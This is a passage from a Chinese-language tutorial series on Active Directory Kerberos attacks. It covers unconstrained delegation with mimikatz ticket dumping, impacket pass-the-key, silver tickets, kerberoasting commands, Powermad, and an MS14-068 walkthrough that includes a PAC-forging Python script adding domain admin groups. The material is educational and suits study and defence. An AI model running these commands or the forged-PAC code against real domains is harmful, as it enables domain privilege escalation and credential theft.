<li>sekurlsa::tickets</li>
</ul>
<p>kerberos 的sekurlsa::tickets 可用于导出票据</p>
<p>对于非约束委派，使用mimikatz利用如下</p>
<ol>
<li>通过adfind 寻找具有非约束委派的机子</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cc7a71b30fed28e8.png"></p>
<ol start="2">
<li>打下jackson-PC</li>
</ol>
<p>然后使用钓鱼或者打印机哪个漏洞，诱导域管过来访问jackson-PC</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01292ba36d2d5bccab.png"></p>
<ol start="3">
<li>在jackson-PC使用mimikatz 导出域管的TGT(因为要从lsass里面导出来，所以需要本机管理员的权限)</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0113b6204fe9e75284.png"></p>
<ol start="4">
<li>ptt</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f57886a07c6ecdc.png"></p>
<h4 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h4><p>在impakcet里面很多程序都支持pass the key,只需要</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/path/to/ccache/file</span><br></pre></td></tr></table></figure>

<p>然后在需要<code>pass the key</code>的程序里面加<code>-k -no-pass</code>就行。<br>以<code>secretsdump.py</code>为例</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0162be326ffab71b35.png"></p>
<p>Impact 里面跟TGT_REQ相关的脚本主要有3个。</p>
<ul>
<li>getST.py</li>
</ul>
<p>在ccache中输入密码，哈希，aesKey或TGT后，此脚本将请求服务票证并将其另存为ccache。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014941e8541eb8cf06.png"></p>
<ul>
<li>GetUserSPNs.py</li>
</ul>
<p>此示例将尝试查找和获取与普通用户帐户关联的服务主体名称。输出与JtR和HashCat兼容。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01952d728b204b69b4.png"></p>
<ul>
<li>ticketer.py</li>
</ul>
<p>该脚本将从零开始或基于模板（从KDC合法请求）创建Golden &#x2F; Silver票据，允许您自定义PAC_LOGON_INFO结构中设置的一些参数，特别是组，ExtraSids，持续时间等，票据格式是ccache.</p>
<p>利用已知的服务账号的密码(如通过kerberosting)计算出hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;p@Assword!123&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f3c6f0fe78e2630d.png"></p>
<p>获取域的sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01413b1909ef9d4ce8.png"></p>
<p>制作白银票据</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015c9009579c1d7b29.png"></p>
<p>在使用白银票据进行 传递的时候会出现KRB_AP_ERR_MODIFIED(Message stream modified)，尚未解决</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019a3a9ea086b7bd11.png"></p>
<h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a><a href="https://github.com/nidem/kerberoast">kerberoast</a></h4><p>Kerberoast是用于攻击MS Kerberos实现的一系列工具</p>
<p>用系统内置的工具setspn提取出所有的spn</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; setspn  -Q */*</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f003f5f857bdd2cb.png"></p>
<p>请求票据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">&quot;MSSQLSvc/sqlserver.jmu.com:1433&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c1f0c07ad7c7bfaf.png"></p>
<p>从 Mimikatz 里面提取票据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="meta"># kerberos::list /export</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b21ff179db9489ca.png"></p>
<p>使用 tgsrepcrack 爆破票据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">./tgsrepcrack.py wordlist.txt <span class="number">1</span>-MSSQLSvc~sql01.medin.local~<span class="number">1433</span>-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011de1f3aeba729ddc.png"></p>
<h4 id="Powermad"><a href="#Powermad" class="headerlink" title="Powermad"></a>Powermad</h4><p>默认的Active Directory ms-DS-MachineAccountQuota属性设置允许所有域用户向一个域中最多添加10个计算机帐户。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cb55e59c44f6a4ba.png"></p>
<p>Powermad包括一组用于利用ms-DS-MachineAccountQuota的功能，而无需将实际系统附加到AD。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0136f6e3bda0c4feba.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d0e323aada689d68.png"></p>
<p>这个时候的账户还没有在DNS服务器里面注册</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a6d224249922b744.png"></p>
<p>添加个DNS记录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0127cb3685282cd7c0.png"></p>
<h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>这是kerbreos篇的最后一节了。这篇该节主要讲的内容是微软为了访问控制而引进的一个扩展PAC，以及PAC在历史上出现过的一个严重的，允许普通用户提升到域管的漏洞MS14068。</p>
<h3 id="PAC-介绍"><a href="#PAC-介绍" class="headerlink" title="PAC 介绍"></a>PAC 介绍</h3><p>网上很多版本的kerberos的流程是</p>
<ol>
<li>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据</li>
<li>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据</li>
<li>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。</li>
</ol>
<p>上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。</p>
<p>为了解决上面的这个问题，微软引进了PAC，引进PAC之后的kerberos流程变成</p>
<ol>
<li>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，<code>TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</code></li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011f9cbcb54713d1b6.png"></p>
<ol start="2">
<li><p>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(<code>这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据</code>，具体内容可以参考TGSREQ&amp;TGSREP，也就是上一节)</p>
</li>
<li><p>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边询问用户有没有访问权限，域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）就允许用户访问。</p>
</li>
</ol>
<blockquote>
<p>特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</p>
</blockquote>
<h3 id="PAC结构"><a href="#PAC结构" class="headerlink" title="PAC结构"></a>PAC结构</h3><p>PAC的结构如下图所示。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage001.png"></p>
<p>PAC整体的结构上是一个AuthorizationData的结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AuthorizationData       ::= SEQUENCE OF SEQUENCE &#123;</span><br><span class="line">              ad-type         [<span class="number">0</span>] Int32,</span><br><span class="line">              ad-data         [<span class="number">1</span>] OCTET STRING</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>AuthorizationData结构的ad-type主要有以下几个</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AD-IF-RELEVANT                     <span class="number">1</span></span><br><span class="line">AD-INTENDED-FOR-SERVER             <span class="number">2</span></span><br><span class="line">AD-INTENDED-FOR-APPLICATION-CLASS  <span class="number">3</span></span><br><span class="line">AD-KDC-ISSUED                      <span class="number">4</span></span><br><span class="line">AD-AND-OR                          <span class="number">5</span></span><br><span class="line">AD-MANDATORY-TICKET-EXTENSIONS     <span class="number">6</span></span><br><span class="line">AD-IN-TICKET-EXTENSIONS            <span class="number">7</span></span><br><span class="line">AD-MANDATORY-FOR-KDC               <span class="number">8</span></span><br><span class="line">Reserved values                 <span class="number">9</span><span class="number">-63</span></span><br><span class="line">OSF-DCE                           <span class="number">64</span></span><br><span class="line">SESAME                            <span class="number">65</span></span><br><span class="line">AD-OSF-DCE-PKI-CERTID             <span class="number">66</span> (hemsath @us.ibm.com)</span><br><span class="line">AD-WIN2K-PAC                     <span class="number">128</span> (jbrezak @exchange.microsoft.com)</span><br><span class="line">AD-ETYPE-NEGOTIATION             <span class="number">129</span>  (lzhu @windows.microsoft.com)</span><br></pre></td></tr></table></figure>

<p>如上图所示，整个PAC最外层的ad-type为AD-IF-RELEVANT，ad-data还是一个AuthorizationData结构。</p>
<p>这个AuthorizationData的ad-type 为AD-WIN2K-PAC，ad-data为一段连续的空间，</p>
<p>这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER</p>
<p>头部PACTYPE包括cBuffers,版本以及缓冲区，PAC_INFO_BUFFER为key-value型的</p>
<p>key 的类型如下表所示</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0x00000001</td>
<td align="left">登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x00000002</td>
<td align="left">凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td>
</tr>
<tr>
<td align="left">0x00000006</td>
<td align="left">服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x00000007</td>
<td align="left">KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000A</td>
<td align="left">客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000B</td>
<td align="left">受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000C</td>
<td align="left">用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td>
</tr>
<tr>
<td align="left">0x0000000D</td>
<td align="left">客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000E</td>
<td align="left">设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td align="left">0x0000000F</td>
<td align="left">设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td>
</tr>
</tbody></table>
<p>下面详细介绍四个比较重要的</p>
<ul>
<li>0x00000001   KERB_VALIDATION_INFO</li>
</ul>
<p>这个结构是登录信息，也是整个PAC最重要的部分，整个PAC就靠它来验证用户身份了，是个结构体，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KERB_VALIDATION_INFO</span> &#123;</span></span><br><span class="line">   FILETIME LogonTime;</span><br><span class="line">   FILETIME LogoffTime;</span><br><span class="line">   FILETIME KickOffTime;</span><br><span class="line">   FILETIME PasswordLastSet;</span><br><span class="line">   FILETIME PasswordCanChange;</span><br><span class="line">   FILETIME PasswordMustChange;</span><br><span class="line">   RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">   RPC_UNICODE_STRING FullName;</span><br><span class="line">   RPC_UNICODE_STRING LogonScript;</span><br><span class="line">   RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">   USHORT LogonCount;</span><br><span class="line">   USHORT BadPasswordCount;</span><br><span class="line">   ULONG UserId; <span class="comment">//用户的sid</span></span><br><span class="line">   ULONG PrimaryGroupId; </span><br><span class="line">   ULONG GroupCount;</span><br><span class="line">   [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;<span class="comment">//用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span></span><br><span class="line">   ULONG UserFlags;</span><br><span class="line">   USER_SESSION_KEY UserSessionKey;</span><br><span class="line">   RPC_UNICODE_STRING LogonServer;</span><br><span class="line">   RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">   PISID LogonDomainId;</span><br><span class="line">   ULONG Reserved1[<span class="number">2</span>];</span><br><span class="line">   ULONG UserAccountControl;</span><br><span class="line">   ULONG SubAuthStatus;</span><br><span class="line">   FILETIME LastSuccessfulILogon;</span><br><span class="line">   FILETIME LastFailedILogon;</span><br><span class="line">   ULONG FailedILogonCount;</span><br><span class="line">   ULONG Reserved3;</span><br><span class="line">   ULONG SidCount;</span><br><span class="line">   [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">   PISID ResourceGroupDomainSid;</span><br><span class="line">   ULONG ResourceGroupCount;</span><br><span class="line">   [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>0x0000000A PAC_CLIENT_INFO</p>
</li>
<li><p>客户端Id（8个字节）：<br>包含在Kerberos初始TGT的authtime</p>
</li>
<li><p>NameLength（2字节）<br>用于指定Name 字段的长度（以字节为单位）。</p>
</li>
<li><p>Name<br>包含客户帐户名的16位Unicode字符数组，格式为低端字节序。</p>
</li>
<li><p>0x00000006和0x00000007 0x00000006 对应的是服务检验和，0x00000007 对应的是KDC校验和。分别由server密码和KDC密码加密，是为了防止PAC内容被篡改。<br>存在签名的原因有两个。首先，存在带有服务器密钥的签名，以防止客户端生成自己的PAC并将其作为加密授权数据发送到KDC，以包含在票证中。其次，提供具有KDC密钥的签名，以防止不受信任的服务伪造带有无效PAC的票证。<br>两个都是PAC_SIGNATURE_DATA结构，他包括以下结构。 1. SignatureType（4个字节）</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">含义</th>
<th align="left">签名长度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0xFFFFFF76</td>
<td align="left">KERB_CHECKSUM_HMAC_MD5</td>
<td align="left">16</td>
</tr>
<tr>
<td align="left">0x0000000F</td>
<td align="left">HMAC_SHA1_96_AES128</td>
<td align="left">12</td>
</tr>
<tr>
<td align="left">0x00000010</td>
<td align="left">HMAC_SHA1_96_AES256</td>
<td align="left">12</td>
</tr>
</tbody></table>
<ol>
<li>Signature<br>包含校验和。签名的长度由SignatureType字段的值确定 3. RODCIdentifier（2个字节）：<br>当KDC为RODC时，包含密钥版本号的前16位。当KDC不是RODC时，此字段不存在。</li>
</ol>
<h3 id="相关安全问题"><a href="#相关安全问题" class="headerlink" title="相关安全问题"></a>相关安全问题</h3><ol>
<li>MS14068<br>补丁编号是KB3011780，域里面最严重的漏洞之一，它允许任意用户提升到域管权限。下面简要分析下该漏洞。</li>
</ol>
<p>该漏洞最本质的地方在于Microsoft Windows Kerberos KDC无法正确检查Kerberos票证请求随附的特权属性证书（PAC）中的有效签名，这里面的签名就是上面提到的服务检验和以及KDC校验和。导致用户可以自己构造一张PAC。 签名原本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，我们没有krbtgt的hash以及服务的hash，就没有办法生成有效的签名，但是问题就出在，实现的时候允许所有的checksum算法都可以，包括MD5。那我们只需要把PAC 进行md5，就生成新的校验和。这也就意味着我们可以随意更改PAC的内容，完了之后再用md5 给他生成一个服务检验和以及KDC校验和。在MS14-068修补程序之后，Microsoft添加了一个附加的验证步骤，以确保校验和类型为KRB_CHECKSUM_HMAC_MD5。</p>
<p>在KERB_VALIDATION_INFO结构里面，我们看到有这两个字段。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0126de90d449af1445.png"></p>
<p>其中GroupId是用户所在所在的组，那只要我们把重要组(比如域管组)的sid加进GroupId。那么服务拿这用户的TGS去询问域管用户是否有访问访问改服务的权限的时候，域控会解密PAC，提取里面用户的sid，以及所在的组(GroupId)，我们已经把域管加进去了，是的域控把把这个用户当做域管组里面的成员。从而达到提升为域管的效果。pykek加入的是以下组,</p>
<ul>
<li>域用户（513）</li>
<li>域管理员（512）</li>
<li>架构管理员（518）</li>
<li>企业管理员（519）</li>
<li>组策略创建者所有者（520）</li>
</ul>
<p>现在我们已经能够伪造pac,将我们放在域管的组里，然后伪造检验和。但是即使用户可以伪造PAC。该漏洞的利用依旧还有一个棘手的问题。 前面我们说过。PAC是包含在TGT里面的,而TGT是krbtgt的用户hash加密的，也就意味着即使我们可以伪造PAC，那我们有什么办法讲PAC放在票据里面传输给KDC呢。漏洞的作者用了一个很巧妙的方式。通过查看pykek的源码发现， 作者将PAC加密成密文放在enc-authorization-data里面，enc-authorization-data的结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AuthorizationData::= SEQUENCE OF SEQUENCE &#123;</span><br><span class="line">   ad-type[<span class="number">0</span>] Int32,</span><br><span class="line">   ad-data[<span class="number">1</span>] OCTET STRING</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ad-type是加密算法 ad-data是pac加密后的内容 加密用的key是客户端生成的。KDC并不知道这个key。KDC会从PA-DATA里面的AP_REQ获取到这个key。从而对ad-data进行解密，然后拿到PAC，再检查校验和。 可能很多人抓包,在AP_REQ里面并没有找到这个key。在上一节里面对于AP_REQ介绍得不多。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ed2dbaa28ada4357.png"></p>
<p>只是说了TGT票据就放在这个结构体里面。这里补充介绍下。 AP_REQ的type是PADATA_TYPE.AP_REQ(INTEGER 1)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0124ad34409cf6eee2.png"></p>
<p>value是如下结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AP-REQ  ::= [APPLICATION <span class="number">14</span>] SEQUENCE &#123;</span><br><span class="line">        pvno            [<span class="number">0</span>] INTEGER (<span class="number">5</span>),</span><br><span class="line">        msg-type        [<span class="number">1</span>] INTEGER (<span class="number">14</span>),</span><br><span class="line">        ap-options      [<span class="number">2</span>] APOptions,</span><br><span class="line">        ticket          [<span class="number">3</span>] Ticket,</span><br><span class="line">        authenticator   [<span class="number">4</span>] EncryptedData -- Authenticator</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之前说的TGT票据放在这个结构体里面，就是放在ticket里面。 authenticator 的内容包括加密类型和用session_key加密Authenticator加密成的密文。 Authenticator的结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Authenticator ::= [APPLICATION <span class="number">2</span>] SEQUENCE  &#123;</span><br><span class="line">     authenticator-vno       [<span class="number">0</span>] INTEGER (<span class="number">5</span>),</span><br><span class="line">     crealm                  [<span class="number">1</span>] Realm,</span><br><span class="line">     cname                   [<span class="number">2</span>] PrincipalName,</span><br><span class="line">     cksum                   [<span class="number">3</span>] Checksum OPTIONAL,</span><br><span class="line">     cusec                   [<span class="number">4</span>] Microseconds,</span><br><span class="line">     ctime                   [<span class="number">5</span>] KerberosTime,</span><br><span class="line">     subkey                  [<span class="number">6</span>] EncryptionKey OPTIONAL,</span><br><span class="line">     seq-number              [<span class="number">7</span>] UInt32 OPTIONAL,</span><br><span class="line">     authorization-data      [<span class="number">8</span>] AuthorizationData OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中加密PAC的密钥就放在subkey里面。 大体流程就是KDC拿到AP_REQ之后，提取里面authenticator的密文，用session_key解密获得subkey，再使用subkey解密enc-authorization-data获得PAC.而PAC是我们自己伪造的.</p>
<p>所以最后梳理一下MS14068漏洞利用思路。</p>
<ol>
<li>发起一个 PA_PAC_REQUEST里面选择include_pac 为false。此时生成的TGT票据是不含有PAC的</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ddb9fad9c10304d7.png"></p>
<ol start="2">
<li>伪造一个PAC。sid为当前用户的sid。将如下组的 sid加进GroupId</li>
</ol>
<ul>
<li>域用户（513）</li>
<li>域管理员（512）</li>
<li>架构管理员（518）</li>
<li>企业管理员（519）</li>
<li>组策略创建者所有者（520）</li>
</ul>
<p>后续kerberos测试工具会加入制作PAC的功能，现在暂时不支持，我们直接利用pykek的代码来生成下，跟ms14068.py的同一文件夹底下，新建makepac.py,代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from kek.pac import build_pac</span><br><span class="line">from kek.util import  gt2epoch</span><br><span class="line">from kek.krb5 import AD_WIN2K_PAC,AuthorizationData,AD_IF_RELEVANT</span><br><span class="line">from pyasn1.codec.der.encoder import encode</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    user_realm = <span class="string">&quot;0day.org&quot;</span> #改成自己的</span><br><span class="line">    user_name = <span class="string">&quot;jack&quot;</span> #改成自己的</span><br><span class="line">    user_sid = <span class="string">&quot;S-1-5-21-1812960810-2335050734-3517558805-1133&quot;</span> #改成自己的</span><br><span class="line">    # logon_time = gt2epoch(str(as_rep_enc[<span class="string">&#x27;authtime&#x27;</span>]))</span><br><span class="line">    logon_time = gt2epoch(<span class="string">&#x27;20191112101422Z&#x27;</span>)</span><br><span class="line">    print(logon_time)</span><br><span class="line">    authorization_data = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))</span><br><span class="line">    ad1 = AuthorizationData()</span><br><span class="line">    ad1[<span class="number">0</span>] = None</span><br><span class="line">    ad1[<span class="number">0</span>][<span class="string">&#x27;ad-type&#x27;</span>] = authorization_data[<span class="number">0</span>]</span><br><span class="line">    ad1[<span class="number">0</span>][<span class="string">&#x27;ad-data&#x27;</span>] = authorization_data[<span class="number">1</span>]</span><br><span class="line">    ad = AuthorizationData()</span><br><span class="line">    ad[<span class="number">0</span>] = None</span><br><span class="line">    ad[<span class="number">0</span>][<span class="string">&#x27;ad-type&#x27;</span>] = AD_IF_RELEVANT</span><br><span class="line">    ad[<span class="number">0</span>][<span class="string">&#x27;ad-data&#x27;</span>] = encode(ad1)</span><br><span class="line">    data =  encode(ad)</span><br><span class="line">    with open(<span class="string">&quot;jack.pac&quot;</span>,<span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">        f.write(data)</span><br></pre></td></tr></table></figure>

<p>注意这里的logon_time来自于第一步中生成的AS_REP的enc_part解密后的的authtime，在工具里面右键复制就行</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016faf1d0dcd0df8b3.png"></p>
<ol start="3">
<li>发起一次服务用户是krbtgt的TGS_REQ，此时导入的TGT里面是不含有PAC的(在第一步里面选择include&#x3D;False返回的TGT不含有pac)，然后将我们伪造的PAC是加密放在 enc-authorization-data里面。加密用的key的放在PA-DATA里面的AP_REQ。此时返回的TGS里面就含有我们伪造的PAC。在之前的章节里面我们说过，在TGS里面，如果请求的服务是krbtgt的话，那么返回的TGS票据是可以当做TGT的。在我们的kerbreos测试工具里面，只需要导入上面makepac.py生成的pac文件。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fb7979dfaa15534e.png"></p>
<ol start="4">
<li>Pass the ticket</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ccbf4c0e16e5b81f.png"></p>
<p>这里面使用kerberos 测试工具只是为了理清楚漏洞流程。更为方便的利用请见底下。</p>
<h3 id="部分相关的工具-1"><a href="#部分相关的工具-1" class="headerlink" title="部分相关的工具"></a>部分相关的工具</h3><h4 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0188cea9720b626dec.png"></p>
<h4 id="impacket-2"><a href="#impacket-2" class="headerlink" title="impacket"></a>impacket</h4><ul>
<li>goldenPac.py</li>
</ul>
<p>这个工具是结合ms14-068加psexec</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fc7bd4e71e733937.png"></p>
<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><ul>
<li>ms14_068_kerberos_checksum</li>
</ul>
<p>msf的这个模块也支持14068攻击利用</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013dfb696027765364.png"></p>
<h4 id="pykek"><a href="#pykek" class="headerlink" title="pykek"></a>pykek</h4><p>全称是<code>Python Kerberos Exploitation Kit</code></p>
<p>应该是ms14068漏洞利用，使用的最广泛的一个，一般常用的ms14068.exe，就是由他打包而成的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bd4cd580bdb9f1e7.png"></p>
<p>先获取sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011cb0f2482c63d3b2.png"></p>
<p>拼接成<code>S-1-5-21-866784659-4049716574-3063611777-1104</code></p>
<p>生成tgt</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0192b5103cce31cc74.png"></p>
<p>验证tgt是否具备域管权限</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f84fbfeeb70e2b7b.png"></p>
<h1 id="NTLM-篇"><a href="#NTLM-篇" class="headerlink" title="NTLM 篇"></a>NTLM 篇</h1><h2 id='p8'>NTLM 基础</h2>

<h3 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h3><p>这个系列文章主要讲ntlm认证相关的内容。以及着重介绍ntlm两大安全问题–PTH和ntlm_relay。</p>
<p>ntlm篇分为四部分</p>
<p>第1块也是本文，这篇主要简单介绍一些基础概念以及引进一些相关的漏洞，比如<code>Pass The Hash</code>以及<code>ntlm_relay</code>。</p>
<p>其余三块的内容全部都是讲<code>ntlm_relay</code>,这个安全问题是ntlm篇的重点内容。</p>
<p>第2块主要讲触发windows向攻击者发起ntlm请求的一些方式,比如大家耳熟能详的打印机漏洞。</p>
<p>第3块主要讲的是攻击者接收到ntlm请求之后做的事，如爆破<code>Net-ntlm</code>，又或者relay到SMB,HTTP,Exchange,LDAP等。</p>
<h3 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash &amp; NTLM Hash"></a>LM Hash &amp; NTLM Hash</h3><p>windows内部是不保存明文密码的，只保存密码的hash。</p>
<p>其中本机用户的密码hash是放在 本地的SAM文件 里面，域内用户的密码hash是存在域控的NTDS.DIT文件 里面。那hash的格式是怎么样的呢?</p>
<p>在Windows系统导出密码的时候，经常看到这样的密码格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Administrator:<span class="number">500</span>:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure>

